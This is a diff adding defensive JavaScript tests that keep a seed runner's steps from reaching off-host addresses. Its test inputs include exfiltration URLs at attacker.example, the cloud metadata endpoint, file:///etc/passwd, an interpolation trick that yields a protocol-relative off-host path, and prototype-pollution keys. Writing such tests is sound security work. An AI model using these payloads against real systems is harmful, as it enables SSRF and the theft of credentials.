@@ -96,3 +96,60 @@ describe('seed runner', () => {
     assert.throws(() => normaliseSeedStep({ name: 'x' }, 0), /path is required/);
   });
 });
+
+describe('a seed step cannot address anything but the trial', () => {
+  const step = (over) => normaliseSeedStep({ name: 'x', path: '/ok', ...over }, 0);
+
+  test('absolute and protocol-relative paths are rejected at parse time', () => {
+    // Seed bodies carry the trial's generated admin password. new URL() drops
+    // the base for an absolute path, so this would exfiltrate them.
+    for (const path of [
+      'https://attacker.example/collect',
+      'http://169.254.169.254/latest/meta-data/',
+      '//attacker.example/collect',
+      'file:///etc/passwd',
+      'relative/path',
+    ]) {
+      assert.throws(() => step({ path }), /path must be local/, path);
+    }
+    assert.equal(step({ path: '/api/setup' }).path, '/api/setup');
+  });
+
+  test('a captured value cannot redirect a later step off-host', async () => {
+    let leaked = false;
+    const app = await stubApp((req, res) => {
+      if (req.url === '/token') {
+        res.setHeader('content-type', 'application/json');
+        // A leading slash is what makes this work: interpolated into "/${next}"
+        // it yields "//attacker.example/collect", which is protocol-relative
+        // and resolves off-host. Parse-time validation cannot see it, because
+        // at parse time the path is still the literal "/${next}".
+        return res.end(JSON.stringify({ next: '/attacker.example/collect' }));
+      }
+      leaked = true;
+      res.end('{}');
+    });
+    try {
+      const res = await runSeed({
+        baseUrl: app.url,
+        steps: [
+          normaliseSeedStep({ name: 'get', method: 'GET', path: '/token', capture: { next: 'next' } }, 0),
+          // Passes parse-time validation; only interpolation makes it absolute.
+          normaliseSeedStep({ name: 'send', path: '/${next}', body: { pw: '${password}' } }, 1),
+        ],
+        vars: { password: 'hunter2' },
+      });
+      assert.equal(res.ran, 1, 'the second step must not have run');
+      assert.equal(res.failed, 1);
+      assert.equal(leaked, false);
+    } finally {
+      app.close();
+    }
+  });
+
+  test('capture names that would poison the scope are rejected', () => {
+    for (const key of ['__proto__', 'constructor', 'prototype']) {
+      assert.throws(() => step({ capture: { [key]: 'a.b' } }), /unsafe capture name/, key);
+    }
+  });
+});
